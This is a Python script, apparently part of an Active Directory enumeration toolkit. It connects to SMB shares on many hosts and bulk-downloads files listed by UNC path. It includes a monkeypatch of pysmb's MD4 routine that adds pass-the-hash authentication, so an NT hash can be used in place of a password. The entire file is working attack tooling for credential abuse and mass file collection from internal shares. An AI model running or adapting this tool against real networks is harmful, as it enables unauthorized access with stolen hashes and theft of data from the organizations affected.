#!/usr/bin/env python3
'''
Use enumshares.py to get unc paths to files then feed them into this script.
'''
import os
import sys
import logging
import argparse
import binascii
import concurrent.futures

import smb
from smb.SMBConnection import SMBConnection

logger = logging.getLogger(__name__)

class MyMD4Class():
    ''' class to add pass-the-hash support to pysmb '''
    @staticmethod
    def new():
        return MyMD4Class()
    def update(self, p):
        self.nthash = binascii.unhexlify(p.decode('utf-16-le'))
    def digest(self):
        return self.nthash

def get_components(fullpath):
    host, share, path = fullpath[2:].split('\\', maxsplit=2)
    return host, share, path

def get_thread(args, work, host):
    logger.debug('Connecting to {} as {}\\{}'.format(host, args.domain or '', args.username))
    conn = SMBConnection(args.username, args.password, 'adenum', host, use_ntlm_v2=True,
                         domain=args.domain, is_direct_tcp=(args.smb_port != 139))
    conn.connect(host, port=args.smb_port)
    shares = [s.name.lower() for s in conn.listShares() if s.type == smb.base.SharedDevice.DISK_TREE]
    for s in work[host]:
        if s.lower() in shares:
            for f in work[host][s]:
                logger.info('Getting '+host+'\\'+f)
                if args.stdout:
                    # not thread safe but likely just want to grep output anyway
                    with os.fdopen(sys.stdout.fileno(), 'wb') as fp:
                        conn.retrieveFile(s, f, fp)
                        fp.write(b'\n')
                else:
                    local_path = (host+'\\'+f).replace('\\', '/')
                    os.makedirs(os.path.dirname(local_path), mode=0o770, exist_ok=True)
                    with open(local_path, 'wb') as fp:
                        conn.retrieveFile(s, f, fp)
    conn.close()

def get_files(args):
    if args.nthash:
        logger.debug('passing the NTLM hash')
        smb.ntlm.MD4 = MyMD4Class.new
    files = list(args.paths)
    if args.filename:
        files.extend([l.strip() for l in open(args.filename)])
    work = {}
    for f in files:
        host, share, path = get_components(f)
        host = host.lower()
        if host not in work:
            work[host] = {}
        if share not in work[host]:
            work[host][share] = []
        work[host][share].append(path)
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as e:
        concurrent.futures.wait([e.submit(get_thread, args, work, h) for h in work])

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--username', required=True, help='username')
    parser.add_argument('-p', '--password', required=True, help='password')
    parser.add_argument('-d', '--domain', default='.', help='AD domain')
    parser.add_argument('-w', '--workers', default=1, type=int, help='worker threads')
    parser.add_argument('-f', '--filename', help='file of unc paths')
    parser.add_argument('paths', nargs='*', help='full unc path to file')
    parser.add_argument('--nthash', action='store_true', help='password is the nthash')
    parser.add_argument('--smb-port', dest='smb_port', type=int, default=445, help='SMB port. default 445')
    parser.add_argument('--debug', action='store_true', help='enable debug output')
    parser.add_argument('-O', '--stdout', action='store_true', help='output file contents to stdout')
    args = parser.parse_args()

    if args.debug:
        h = logging.StreamHandler()
        h.setFormatter(logging.Formatter('[%(levelname)s] %(filename)s:%(lineno)s %(message)s'))
        for n in [__name__]:
            l = logging.getLogger(n)
            l.setLevel(logging.DEBUG)
            l.addHandler(h)

    get_files(args)